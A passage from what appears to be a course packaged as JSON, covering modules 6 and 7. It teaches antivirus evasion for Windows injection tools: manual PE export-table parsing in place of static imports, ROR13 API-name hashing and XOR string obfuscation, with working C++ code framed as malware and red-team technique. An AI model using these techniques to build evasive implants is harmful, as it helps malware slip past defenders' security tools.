seconds\r\n\r\n    // Set the timer. The callback MyTimerProc will be called after 2 seconds.\r\n    UINT_PTR resultTimerId = SetTimer(hWndConsole, timerId, delay, MyTimerProc);\r\n\r\n    if (resultTimerId == 0) {\r\n        std::cerr << \"[-] Failed to set timer. Error: \" << Get"
    },
    {
      "title": "module_6",
      "description": "module_6 Overview",
      "order": 6,
      "content": "Alright team, buckle up! We've laid the groundwork by understanding process internals, threads, and different execution contexts. We've even dipped our toes into APCs, Native API, and Fibers. But let's be honest, a tool that statically imports `VirtualAllocEx`, `CreateRemoteThread`, or even `NtCreateThreadEx` is screaming \"look at me!\" to security products.\r\n\r\nIn this module, we're leveling up our stealth game significantly. We're going to tackle the fundamental problem of static imports and learn how to make our tools resolve the necessary Windows API functions *dynamically* at runtime. This means analyzing the Portable Executable (PE) format ourselves, just like the Windows loader does, to find the addresses of the functions we need. This is a cornerstone technique in sophisticated malware and red team tools, and it draws heavily from the kind of low-level PE manipulation concepts you'd find discussed in places like `zhasslan.txt`.\r\n\r\nLet's dive deep into the guts of the PE format and build our own dynamic resolver!\r\n\r\n---\r\n\r\n## Module 6: Stealth Operations - Dynamic API Resolution and Export Tables\r\n\r\n**Module Objective:** Understand the necessity of hiding API calls from static analysis and implement the core logic to dynamically resolve required API function addresses at runtime by parsing the Portable Execable (PE) format's Export Directory.\r\n\r\n**Estimated Time:** 4-6 hours (including coding and debugging)\r\n\r\n### 6.1 The Problem with Static Imports (IAT)\r\n\r\nOkay, let's start with *why* we're doing this. When you write a typical C/C++ program that calls Windows API functions like `MessageBoxA`, `CreateFileA`, or `VirtualAlloc`, the compiler and linker work together to create an Import Address Table (IAT) in your executable's PE header.\r\n\r\n*   **What is the IAT?** It's essentially a list of all the functions your program intends to import from external DLLs (like `kernel32.dll`, `user32.dll`).\r\n*   **How does it work?** The IAT contains entries for each imported function. Initially, these entries might hold hints (like the function name or ordinal). When the Windows loader maps your executable into memory, it finds the required DLLs, resolves the actual memory addresses of those functions within the loaded DLLs, and patches the IAT entries in your executable with those addresses. Your code then calls the function indirectly via the IAT entry.\r\n*   **The Security Problem:** Static analysis tools, antivirus engines, and even simple command-line utilities like `dumpbin` can easily parse your executable's PE header and read the IAT. They can see exactly which functions from which DLLs your program *intends* to use *before* it even runs. If your program imports `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`, that's a pretty strong indicator that it might be doing process injection. This provides a static signature that's easy for defenders to detect.\r\n\r\nOur goal is to eliminate or minimize this static footprint. We want our executable to look like it imports very little (maybe just a few basic functions needed to *start* our custom loader), and then have our loader code dynamically find and call all the sensitive APIs at runtime.\r\n\r\n### 6.2 How the Windows Loader Resolves Imports (A Quick Look)\r\n\r\nTo understand how to *manually* resolve APIs, it helps to know how the OS loader does it. When the loader loads an executable or a DLL:\r\n\r\n1.  It reads the PE header, specifically the Import Directory.\r\n2.  For each required DLL listed in the Import Directory, it loads that DLL into memory.\r\n3.  For each function listed in the IAT for that DLL:\r\n    *   It looks up the function's address within the *Export Directory* of the loaded DLL.\r\n    *   It writes the resolved address into the corresponding IAT entry of the importing module.\r\n\r\nOur dynamic resolution will mimic step 3, but *our code* will do the lookup by parsing the target DLL's Export Directory, rather than the OS loader doing it based on our IAT.\r\n\r\n### 6.3 Diving into the PE Format: Focus on the Export Directory\r\n\r\nThe Portable Executable (PE) format is the structure of executables (`.exe`), DLLs (`.dll`), and object files (`.obj`) on Windows. While complex, we only need to understand specific parts to implement dynamic API resolution.\r\n\r\nWe need to navigate a series of structures starting from the base address of a loaded module (like `kernel32.dll`).\r\n\r\n1.  **DOS Header (`IMAGE_DOS_HEADER`)**: The very beginning of the file/module. It's a legacy structure from MS-DOS days.\r\n    *   We need the `e_lfanew` field. This is a `LONG` (32-bit offset) that points to the start of the `IMAGE_NT_HEADERS`. It's an **RVA** (Relative Virtual Address) from the base of the module.\r\n\r\n2.  **NT Headers (`IMAGE_NT_HEADERS`)**: This structure contains core information about the PE file.\r\n    *   It starts with a `Signature` (`DWORD`) which should be `IMAGE_NT_SIGNATURE` (0x00004550, or \"PE\\0\\0\"). Always check this for validation!\r\n    *   It contains an `IMAGE_FILE_HEADER` (which isn't critical for us here).\r\n    *   Crucially, it contains the `IMAGE_OPTIONAL_HEADER`.\r\n\r\n3.  **Optional Header (`IMAGE_OPTIONAL_HEADER`)**: Despite the name, this header is essential for executables and DLLs. It contains vital information about the layout and properties of the image in memory.\r\n    *   We need the `DataDirectory` field. This is an array of `IMAGE_DATA_DIRECTORY` structures. Each entry points to a different important data structure (like the Import Directory, Export Directory, Resource Directory, etc.) and gives its size.\r\n    *   The `DataDirectory` array has a fixed number of entries, defined by `IMAGE_NUMBEROF_DIRECTORY_ENTRIES` (usually 16). The *first* entry (index 0) is the **Export Directory**.\r\n\r\n4.  **Data Directory (`IMAGE_DATA_DIRECTORY`)**: Each entry in the `DataDirectory` array has two fields:\r\n    *   `VirtualAddress`: The **RVA** of the data structure (e.g., the Export Directory Table).\r\n    *   `Size`: The size of the data structure.\r\n\r\n5.  **Export Directory Table (`IMAGE_EXPORT_DIRECTORY`)**: This is the structure we finally reach by following the RVA from the first `IMAGE_DATA_DIRECTORY` entry. It contains the information needed to find exported functions.\r\n    *   `Base`: The starting ordinal number for the functions exported by ordinal.\r\n    *   `NumberOfFunctions`: Total number of exported functions.\r\n    *   `NumberOfNames`: Number of exported functions that have names (i.e., listed in the `AddressOfNames` array). Functions can be exported *only* by ordinal, or by both name and ordinal.\r\n    *   `AddressOfFunctions`: An **RVA** to an array of RVAs. This is the **Export Address Table (EAT)**. Each entry in this array is the RVA of an exported function's entry point. The index into this array is `Ordinal - Base`.\r\n    *   `AddressOfNames`: An **RVA** to an array of RVAs. Each entry in this array is the RVA of a null-terminated ASCII string containing the name of an exported function.\r\n    *   `AddressOfNameOrdinals`: An **RVA** to an array of `WORD`s. This array maps the index from the `AddressOfNames` array to the corresponding ordinal number of the function. If a function is the `i`-th name in the `AddressOfNames` array, its ordinal is `AddressOfNameOrdinals[i]`.\r\n\r\n**Putting it Together: The Lookup Process**\r\n\r\nTo find the address of a function by name (e.g., \"CreateProcessA\") in a loaded module (e.g., `kernel32.dll`) at address `hModule`:\r\n\r\n1.  Calculate the address of the DOS Header: `dosHeader = (IMAGE_DOS_HEADER*)hModule`.\r\n2.  Validate the DOS Header signature (`dosHeader->e_magic == IMAGE_DOS_SIGNATURE`).\r\n3.  Calculate the address of the NT Headers: `ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew)`.\r\n4.  Validate the NT Headers signature (`ntHeaders->Signature == IMAGE_NT_SIGNATURE`).\r\n5.  Get the address of the Optional Header: `optionalHeader = &ntHeaders->OptionalHeader`.\r\n6.  Get the address of the Data Directories array: `dataDir = optionalHeader->DataDirectory`.\r\n7.  Check if the Export Directory entry is valid (i.e., `dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size > 0`).\r\n8.  Calculate the address of the Export Directory Table: `exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)`.\r\n9.  Calculate the base addresses of the three key arrays by adding their RVAs (from `exportDir`) to the module base address (`hModule`):\r\n    *   `addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions)`\r\n    *   `addressOfNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames)`\r\n    *   `addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals)`\r\n10. Iterate through the `AddressOfNames` array from index 0 to `exportDir->NumberOfNames - 1`.\r\n11. For each index `i`:\r\n    *   Get the RVA of the function name string: `nameRVA = addressOfNames[i]`.\r\n    *   Calculate the address of the function name string: `functionName = (char*)((BYTE*)hModule + nameRVA)`.\r\n    *   Compare `functionName` with the target function name string (e.g., \"CreateProcessA\") using `strcmp`.\r\n12. If `strcmp` returns 0 (names match):\r\n    *   Get the function's ordinal from the `AddressOfNameOrdinals` array using the current index `i`: `ordinal = addressOfNameOrdinals[i]`.\r\n    *   Get the function's RVA from the `AddressOfFunctions` array using the ordinal: `functionRVA = addressOfFunctions[ordinal]`.\r\n    *   Calculate the function's virtual address (the actual memory address where the code starts): `functionAddress = (void*)((BYTE*)hModule + functionRVA)`.\r\n    *   Return `functionAddress`.\r\n13. If the loop finishes without finding the name, the function is not exported by name (or doesn't exist), return `NULL`.\r\n\r\n**Handling Ordinal Exports and Forwarders:**\r\n\r\n*   **Ordinal Exports:** Some functions are *only* exported by ordinal, not by name. Our current algorithm (which iterates `AddressOfNames`) won't find these. To find functions by ordinal, you'd calculate the index into `AddressOfFunctions` as `Ordinal - Base` and retrieve the RVA directly. For this module's project, finding by name is sufficient, but be aware of ordinal-only exports.\r\n*   **Forwarders:** An export can sometimes be a \"forwarder\" string (e.g., \"NtCreateThreadEx\" in `kernel32.dll` is forwarded to \"NtCreateThreadEx\" in `ntdll.dll`). The RVA in the EAT points to a string like `\"ntdll.NtCreateThreadEx\"` instead of code. Our simple RVA-to-VA conversion will yield a pointer to this string. A robust resolver needs to detect if an RVA falls within the Export Directory itself and, if so, parse the forwarder string, load the target DLL (if not already loaded), and resolve the function in the target DLL. This adds complexity. For this module, we will primarily focus on resolving non-forwarded functions or assume we handle forwarders by resolving the *target* function in the *target* DLL manually (e.g., resolve `NtCreateThreadEx` directly from `ntdll.dll` instead of `kernel32.dll`).\r\n\r\n### 6.4 Implementing the Manual PE Parser and Resolver\r\n\r\nLet's translate the algorithm into C++ code. We'll need Windows headers for the PE structure definitions.\r\n\r\n```c++\r\n#include <windows.h>\r\n#include <winternl.h> // For PE structure definitions (like IMAGE_NT_HEADERS)\r\n#include <stdio.h>    // For printf\r\n#include <string.h>   // For strcmp\r\n\r\n// Define necessary PE structures if winternl.h isn't available or sufficient\r\n// (winternl.h is usually sufficient on modern MSVC)\r\n#ifndef IMAGE_NT_SIGNATURE\r\n#define IMAGE_NT_SIGNATURE    0x00004550  // PE00\r\n#endif\r\n\r\n#ifndef IMAGE_DOS_SIGNATURE\r\n#define IMAGE_DOS_SIGNATURE   0x5A4D      // MZ\r\n#endif\r\n\r\n// IMAGE_DIRECTORY_ENTRY_EXPORT is typically defined as 0\r\n\r\n/*\r\n * ManualGetProcAddress: Dynamically resolves the address of an exported function\r\n *                        within a loaded module by manually parsing its PE header.\r\n *\r\n * hModule: Base address of the loaded module (e.g., HMODULE from GetModuleHandle).\r\n * lpProcName: Name of the function to resolve (ASCII string).\r\n *\r\n * Returns: The address of the function if found, NULL otherwise.\r\n */\r\nvoid* ManualGetProcAddress(HMODULE hModule, const char* lpProcName) {\r\n    // Validate module handle\r\n    if (!hModule) {\r\n        fprintf(stderr, \"Error: Invalid module handle.\\n\");\r\n        return NULL;\r\n    }\r\n\r\n    // 1. Get the DOS header\r\n    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;\r\n\r\n    // 2. Validate DOS header signature\r\n    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {\r\n        fprintf(stderr, \"Error: Invalid DOS signature.\\n\");\r\n        return NULL;\r\n    }\r\n\r\n    // 3. Get the NT headers using e_lfanew\r\n    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);\r\n\r\n    // 4. Validate NT headers signature\r\n    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {\r\n        fprintf(stderr, \"Error: Invalid NT signature.\\n\");\r\n        return NULL;\r\n    }\r\n\r\n    // 5. Get the Optional Header (contains Data Directories)\r\n    // 6. Get the Data Directories array from the Optional Header\r\n    PIMAGE_DATA_DIRECTORY dataDirectory = ntHeaders->OptionalHeader.DataDirectory;\r\n\r\n    // 7. Check if the Export Directory exists (entry 0)\r\n    if (dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0) {\r\n        fprintf(stderr, \"Error: Module has no export directory.\\n\");\r\n        return NULL;\r\n    }\r\n\r\n    // 8. Calculate the address of the Export Directory Table\r\n    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\r\n\r\n    // 9. Calculate the base addresses of the three key arrays\r\n    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);\r\n    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);\r\n    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);\r\n\r\n    // 10. Iterate through the array of function names\r\n    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {\r\n        // Get the RVA of the current function name string\r\n        DWORD nameRVA = addressOfNames[i];\r\n        // Calculate the address of the function name string\r\n        char* functionName = (char*)((BYTE*)hModule + nameRVA);\r\n\r\n        // 11. Compare the current function name with the target name\r\n        if (strcmp(functionName, lpProcName) == 0) {\r\n            // 12. If names match, get the ordinal from the ordinal array\r\n            WORD ordinal = addressOfNameOrdinals[i];\r\n\r\n            // Get the RVA of the function's entry point from the address array\r\n            DWORD functionRVA = addressOfFunctions[ordinal];\r\n\r\n            // Check for forwarded exports (RVA points inside the export directory itself)\r\n            // This is a basic check; a full implementation would parse the forwarder string\r\n            // For this module, we'll assume non-forwarded functions or handle specific ones\r\n            // by resolving the target directly (e.g., ntdll!NtCreateThreadEx)\r\n             if (functionRVA >= dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress &&\r\n                functionRVA < dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)\r\n            {\r\n                 // This RVA points into the export directory, likely a forwarder string.\r\n                 // We are not handling forwarders in this basic implementation.\r\n                 // You would typically read the string here and resolve the target.\r\n                 fprintf(stderr, \"Warning: Function '%s' appears to be a forwarder. Not resolved.\\n\", lpProcName);\r\n                 return NULL; // Or implement forwarder resolution\r\n            }\r\n\r\n            // Calculate the function's virtual address\r\n            void* functionAddress = (void*)((BYTE*)hModule + functionRVA);\r\n\r\n            // Return the function address\r\n            return functionAddress;\r\n        }\r\n    }\r\n\r\n    // 13. Function not found by name\r\n    fprintf(stderr, \"Error: Function '%s' not found in module exports.\\n\", lpProcName);\r\n    return NULL;\r\n}\r\n\r\n// --- Example Usage ---\r\nint main() {\r\n    // For demonstration in this module, we'll use GetModuleHandleA to get the base address.\r\n    // In a true stealth scenario, you would find module base addresses manually (e.g., via PEB walk).\r\n    HMODULE hKernel32 = GetModuleHandleA(\"kernel32.dll\");\r\n\r\n    if (!hKernel32) {\r\n        fprintf(stderr, \"Error: Could not get handle for kernel32.dll\\n\");\r\n        return 1;\r\n    }\r\n\r\n    printf(\"kernel32.dll base address: %p\\n\", hKernel32);\r\n\r\n    // Try resolving a standard WinAPI function\r\n    const char* funcName = \"CreateProcessA\";\r\n    void* pfnCreateProcessA = ManualGetProcAddress(hKernel32, funcName);\r\n\r\n    if (pfnCreateProcessA) {\r\n        printf(\"Resolved address of %s: %p\\n\", funcName, pfnCreateProcessA);\r\n\r\n        // You could now cast pfnCreateProcessA to the correct function pointer type\r\n        // and call it, e.g.:\r\n        // typedef BOOL (WINAPI* fnCreateProcessA)(\r\n        //    LPCSTR                lpApplicationName,\r\n        //    LPSTR                 lpCommandLine,\r\n        //    LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        //    LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        //    BOOL                  bInheritHandles,\r\n        //    DWORD                 dwCreationFlags,\r\n        //    LPVOID                lpEnvironment,\r\n        //    LPCSTR                lpCurrentDirectory,\r\n        //    LPSTARTUPINFOA        lpStartupInfo,\r\n        //    LPPROCESS_INFORMATION lpProcessInformation\r\n        // );\r\n        // fnCreateProcessA pfn = (fnCreateProcessA)pfnCreateProcessA;\r\n        // ... use pfn to call CreateProcessA ...\r\n\r\n    } else {\r\n        fprintf(stderr, \"Failed to resolve %s\\n\", funcName);\r\n    }\r\n\r\n     // Try resolving another function\r\n    const char* funcName2 = \"VirtualAllocEx\";\r\n    void* pfnVirtualAllocEx = ManualGetProcAddress(hKernel32, funcName2);\r\n\r\n    if (pfnVirtualAllocEx) {\r\n        printf(\"Resolved address of %s: %p\\n\", funcName2, pfnVirtualAllocEx);\r\n    } else {\r\n        fprintf(stderr, \"Failed to resolve %s\\n\", funcName2);\r\n    }\r\n\r\n    // Try resolving a function that might not exist or be exported by name\r\n    const char* funcName3 = \"NonExistentFunction\";\r\n     void* pfnNonExistent = ManualGetProcAddress(hKernel32, funcName3);\r\n\r\n    if (pfnNonExistent) {\r\n        printf(\"Resolved address of %s: %p\\n\", funcName3, pfnNonExistent);\r\n    } else {\r\n        fprintf(stderr, \"Failed to resolve %s (Expected failure)\\n\", funcName3);\r\n    }\r\n\r\n    // Note: For resolving NTAPI functions like NtAllocateVirtualMemory,\r\n    // you would typically get the handle for \"ntdll.dll\" and parse its exports.\r\n    // HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\r\n    // void* pfnNtAllocateVirtualMemory = ManualGetProcAddress(hNtdll, \"NtAllocateVirtualMemory\");\r\n    // ...\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n**Explanation of the Code:**\r\n\r\n1.  **Includes:** We need `windows.h` for basic Windows types, `winternl.h` for the PE structure definitions (like `IMAGE_NT_HEADERS`, `IMAGE_EXPORT_DIRECTORY`, etc.), and standard C headers for printing and string comparison.\r\n2.  **Structure Definitions:** We include checks for `IMAGE_NT_SIGNATURE` and `IMAGE_DOS_SIGNATURE` in case `winternl.h` or the environment doesn't define them, but typically, these are standard. `IMAGE_DIRECTORY_ENTRY_EXPORT` is defined as 0, representing the first entry in the Data Directory.\r\n3.  **`ManualGetProcAddress` Function:**\r\n    *   Takes `hModule` (the base address of the DLL/EXE) and `lpProcName` (the name string) as input.\r\n    *   Uses pointer arithmetic (`(BYTE*)hModule + offset`) to navigate through the PE structure in memory. Remember, `hModule` is the base, and RVAs are offsets *from that base*.\r\n    *   Performs validation checks (`e_magic`, `Signature`, `Export Directory Size > 0`) at each major step. Robust code *always* validates!\r\n    *   Calculates the addresses of the `IMAGE_EXPORT_DIRECTORY` and the three associated arrays (`AddressOfFunctions`, `AddressOfNames`, `AddressOfNameOrdinals`) by adding their RVAs to the module base.\r\n    *   Loops through the `AddressOfNames` array.\r\n    *   Inside the loop, it calculates the address of each exported function's name string and uses `strcmp` to compare it to the target name.\r\n    *   If a match is found, it uses the corresponding entry in `AddressOfNameOrdinals` to get the function's ordinal.\r\n    *   It then uses the ordinal as an index into the `AddressOfFunctions` (EAT) to get the function's RVA.\r\n    *   A basic check is added for forwarders (if the RVA points back into the export directory range). For this module, we're just printing a warning and returning NULL for simplicity, but a real-world resolver would handle this recursively.\r\n    *   Finally, it calculates the function's absolute virtual address by adding the function RVA to the module base address and returns it as a `void*`.\r\n    *   If the loop finishes without finding the name, it returns `NULL`.\r\n4.  **`main` Function (Example Usage):**\r\n    *   For demonstration *in this module*, we use `GetModuleHandleA(\"kernel32.dll\")` to get the base address of `kernel32.dll`. **Crucially, in a truly stealthy tool, you would NOT use `GetModuleHandleA` as it's a static import itself!** We will discuss how to find module bases manually in the next module (PEB walk).\r\n    *   It calls our `ManualGetProcAddress` function to resolve `CreateProcessA` and `VirtualAllocEx`.\r\n    *   It prints the resolved addresses.\r\n    *   It includes commented-out code showing how you would cast the returned `void*` to a function pointer type to actually call the function."
    },
    {
      "title": "module_7",
      "description": "module_7 Overview",
      "order": 7,
      "content": "Alright team, welcome back! We've come a long way from just understanding process basics. In Module 6, we cracked open the PE format and learned how to find API function addresses manually at runtime. That was a massive leap towards stealth, getting rid of those tell-tale static imports.\r\n\r\nBut guess what? We can go deeper! While manually parsing the EAT is great, if our code still contains the *literal strings* \"kernel32.dll\", \"VirtualAllocEx\", \"CreateRemoteThread\", etc., static analysis tools or even simple memory scanners looking for known API names can still flag our payload.\r\n\r\nThis module is all about *hiding* our intentions and the tools we're using. We're going to make it much harder for defenders to see which APIs we're calling and even make our code's structure less obvious. We'll draw inspiration from some nasty real-world malware and the principles laid out in texts like `zhasslan.txt` ‚Äì the idea of obscuring your code's purpose and execution flow.\r\n\r\nGet ready to dive into API hashing, string obfuscation, and a brief peek into the world of direct syscalls.\r\n\r\n---\r\n\r\n## **Module 7: Advanced Evasion - Hiding API Calls and Other Techniques**\r\n\r\n*   **Module Objective:** Implement advanced techniques to further obscure the use of system APIs and the presence of malicious code, including hashing API names, string obfuscation, and understanding the role of direct syscalls.\r\n\r\n---\r\n\r\n### **7.1 The Problem with Cleartext API Names**\r\n\r\nLet's quickly recap Module 6. We learned to do this:\r\n\r\n1.  Get the base address of a loaded module (like `kernel32.dll`).\r\n2.  Manually parse its PE header to find the Export Directory.\r\n3.  Iterate through the exported function names.\r\n4.  Compare the name string from the EAT with the name string of the function we want (e.g., \"VirtualAllocEx\").\r\n5.  If they match, calculate the function's address using the EAT data.\r\n\r\nThis successfully avoids having \"VirtualAllocEx\" in our Import Address Table (IAT). *However*, the string \"VirtualAllocEx\" (or \"kernel32.dll\") likely still exists *somewhere* in our code or data section, because we need it as input to our custom `GetProcAddress`-like function.\r\n\r\nSecurity tools perform static analysis. They scan executable files and memory for patterns. Literal strings referencing sensitive APIs are *strong* indicators of potentially malicious activity. Even if you're dynamically resolving, if the string \"NtAllocateVirtualMemory\" is sitting there waiting to be looked up, it's a red flag.\r\n\r\nOur goal in evasion is to break these static patterns and make the code harder to understand without dynamic execution and often, complex runtime analysis.\r\n\r\n### **7.2 Improving Dynamic Resolution: API Hashing**\r\n\r\nThe solution to the cleartext string problem is **API Hashing**. Instead of searching the EAT for a *string* match, we search for a *hash* match.\r\n\r\nHere's the concept:\r\n\r\n1.  We decide on a simple, fast hashing algorithm.\r\n2.  When we want to look up a function (say, `VirtualAllocEx`), we calculate the hash of \"VirtualAllocEx\" *at compile time* or store a pre-calculated hash value.\r\n3.  Our dynamic resolution function now takes this *hash value* as input, instead of the string name.\r\n4.  Inside the dynamic resolution function (our custom `GetProcAddress`), as we iterate through the EAT's exported names, we calculate the hash of *each exported name* we encounter.\r\n5.  We compare this calculated hash with the target hash provided as input.\r\n6.  If the hashes match, we've found our function! We return its address.\r\n\r\nNow, the string \"VirtualAllocEx\" never needs to appear in our code's static form. Only the *hash value* does, which is just a number and much less suspicious than the string itself.\r\n\r\n#### **Choosing a Hashing Algorithm**\r\n\r\nFor malware and shellcode, the hashing algorithm needs to be:\r\n\r\n*   **Simple and Fast:** It will be executed repeatedly during the EAT traversal. Complex algorithms add overhead.\r\n*   **Small Code Size:** Especially critical for shellcode where every byte counts.\r\n*   **Reasonably Unique:** While collisions are possible with simple hashes, they should be rare enough for typical API sets.\r\n\r\nCommon choices include:\r\n\r\n*   **ROR13 (Rotate Right by 13):** A very simple and widely used hash in malware. It iterates through the string, rotating a running hash value right by 13 bits and adding the current character.\r\n*   **DJB2:** Another simple, non-cryptographic hash.\r\n\r\nLet's implement a basic ROR13 hash function as an example.\r\n\r\n```c++\r\n#include <windows.h>\r\n#include <iostream>\r\n\r\n// Simple ROR13 hash function\r\nDWORD ROR13Hash(const char* name) {\r\n    DWORD hash = 0;\r\n    while (*name) {\r\n        // Rotate right by 13 bits\r\n        hash = (hash >> 13) | (hash << (32 - 13));\r\n        // Add the current character (case-insensitive for API names)\r\n        hash += static_cast<DWORD>(*name);\r\n        name++;\r\n    }\r\n    return hash;\r\n}\r\n\r\nint main() {\r\n    // Example usage\r\n    const char* apiName1 = \"VirtualAllocEx\";\r\n    const char* apiName2 = \"WriteProcessMemory\";\r\n    const char* dllName1 = \"kernel32.dll\";\r\n\r\n    DWORD hash1 = ROR13Hash(apiName1);\r\n    DWORD hash2 = ROR13Hash(apiName2);\r\n    DWORD hash3 = ROR13Hash(dllName1);\r\n\r\n    std::cout << \"Hash of \" << apiName1 << \": \" << std::hex << hash1 << std::endl;\r\n    std::cout << \"Hash of \" << apiName2 << \": \" << std::hex << hash2 << std::endl;\r\n    std::cout << \"Hash of \" << dllName1 << \": \" << std::hex << hash3 << std::endl;\r\n\r\n    // Note: In real malware, these hashes would be hardcoded or calculated at compile time\r\n    // and the strings wouldn't appear like this.\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n*(**Self-Correction/Refinement:** The ROR13 hash implementation above is slightly simplified for clarity. A more common variant uses `hash = (hash << 13) | (hash >> (32 - 13))` for ROL13, or uses `hash = (hash >> 13) | (hash << (32 - 13)); hash ^= *name;` or similar variations. The core idea remains: a simple bitwise operation and addition/XOR per character. Let's stick with the provided `ROR13Hash` as it demonstrates the principle clearly for teaching purposes. The key is that *some* deterministic hash is used.)*\r\n\r\n#### **Integrating Hashing into Dynamic Resolution**\r\n\r\nNow, let's think about how this changes our `GetProcAddress`-like function from Module 6.\r\n\r\n**Module 6 (Conceptual `GetProcAddress`):**\r\n\r\n```c++\r\n// Simplified Pseudocode\r\nLPVOID CustomGetProcAddress(LPVOID moduleBase, const char* functionName) {\r\n    // 1. Validate PE header\r\n    // 2. Find Export Directory RVA\r\n    // 3. Get AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals arrays\r\n    // 4. Loop through names:\r\n    //    For each name_rva in AddressOfNames:\r\n    //        char* currentName = moduleBase + name_rva;\r\n    //        If strcmp(currentName, functionName) == 0: // <--- String comparison\r\n    //            // Found it! Get ordinal and then function address\r\n    //            DWORD ordinal = AddressOfNameOrdinals[i]; // i is index in names array\r\n    //            LPVOID functionAddress = moduleBase + AddressOfFunctions[ordinal];\r\n    //            return functionAddress;\r\n    // 5. Return NULL if not found\r\n}\r\n\r\n// Usage:\r\n// LPVOID pVirtualAllocEx = CustomGetProcAddress(hKernel32, \"VirtualAllocEx\");\r\n```\r\n\r\n**Module 7 (Conceptual Hash-Based `GetProcAddress`):**\r\n\r\n```c++\r\n// Simplified Pseudocode\r\nLPVOID CustomGetProcAddressByHash(LPVOID moduleBase, DWORD functionHash) {\r\n    // 1. Validate PE header\r\n    // 2. Find Export Directory RVA\r\n    // 3. Get AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals arrays\r\n    // 4. Loop through names:\r\n    //    For each name_rva in AddressOfNames:\r\n    //        char* currentName = moduleBase + name_rva;\r\n    //        DWORD currentNameHash = ROR13Hash(currentName); // <--- Hash calculation\r\n    //        If currentNameHash == functionHash: // <--- Hash comparison\r\n    //            // Found it! Get ordinal and then function address\r\n    //            DWORD ordinal = AddressOfNameOrdinals[i]; // i is index in names array\r\n    //            LPVOID functionAddress = moduleBase + AddressOfFunctions[ordinal];\r\n    //            return functionAddress;\r\n    // 5. Return NULL if not found\r\n}\r\n\r\n// Usage:\r\n// DWORD virtualAllocExHash = 0x????????; // Pre-calculated hash\r\n// LPVOID pVirtualAllocEx = CustomGetProcAddressByHash(hKernel32, virtualAllocExHash);\r\n```\r\n\r\nThis simple change means the literal string \"VirtualAllocEx\" is no longer needed at runtime lookup. It significantly hinders static analysis.\r\n\r\n**Project Task Connection:** Your Module 7 project will modify your Module 6 code to implement this hash-based lookup. You'll need to decide on a hashing algorithm and integrate it into your PE parsing logic.\r\n\r\n### **7.3 String Obfuscation**\r\n\r\nAPI hashing hides the *function names* during lookup. But what about the *DLL names* (\"kernel32.dll\", \"ntdll.dll\")? And what about the strings representing the *hashes* themselves (if they were stored as hex strings)? And what about other potentially interesting strings in your payload (like command-and-control server addresses, file paths, mutex names)?\r\n\r\nThis is where **String Obfuscation** comes in. The goal is to prevent static analysis tools from easily identifying strings within your executable file.\r\n\r\nSimple techniques involve encoding the strings using a key (like XOR) and decoding them at runtime just before they are used.\r\n\r\n#### **Simple XOR Obfuscation**\r\n\r\nXOR is a common choice because it's simple, reversible (XORing with the same key twice returns the original value), and fast.\r\n\r\n```c++\r\n#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\n// Function to XOR a buffer with a single byte key\r\nvoid XORBuffer(char* data, size_t size, char key) {\r\n    for (size_t i = 0; i < size; ++i) {\r\n        data[i] ^= key;\r\n    }\r\n}\r\n\r\n// Example of how you might use it (simplified)\r\n// In real code, the encoded_string would be defined directly with bytes\r\n// and the decoding would happen at runtime.\r\nint main() {\r\n    const char* original_string = \"kernel32.dll\";\r\n    char key = 0x55; // Our XOR key\r\n\r\n    // --- Compile-time or preparation step ---\r\n    // In a real scenario, you'd compute these encoded bytes\r\n    // using a separate script or build process.\r\n    std::vector<char> encoded_bytes(original_string, original_string + strlen(original_string) + 1); // +1 for null terminator\r\n    XORBuffer(encoded_bytes.data(), encoded_bytes.size(), key);\r\n\r\n    // To see the encoded bytes (what would go in your source code)\r\n    std::cout << \"Encoded bytes (hex): \";\r\n    for (char byte : encoded_bytes) {\r\n        // Print byte as unsigned hex to avoid sign issues\r\n        printf(\"%02X \", static_cast<unsigned char>(byte));\r\n    }\r\n    std::cout << std::endl;\r\n\r\n    // --- Runtime step (what your malware code would do) ---\r\n    // Imagine 'encoded_string_in_memory' is the byte array from above\r\n    char encoded_string_in_memory[] = { /* ... your encoded bytes ... */ }; // Replace with actual encoded bytes\r\n    // Example using the bytes from the vector:\r\n    char runtime_string[100]; // Make sure buffer is large enough\r\n    memcpy(runtime_string, encoded_bytes.data(), encoded_bytes.size());\r\n\r\n\r\n    // Decode the string at runtime before use\r\n    XORBuffer(runtime_string, encoded_bytes.size(), key); // Decode\r\n\r\n    std::cout << \"Decoded string: \" << runtime_string << std::endl;\r\n\r\n    // Now you can use runtime_string (e.g., pass it to 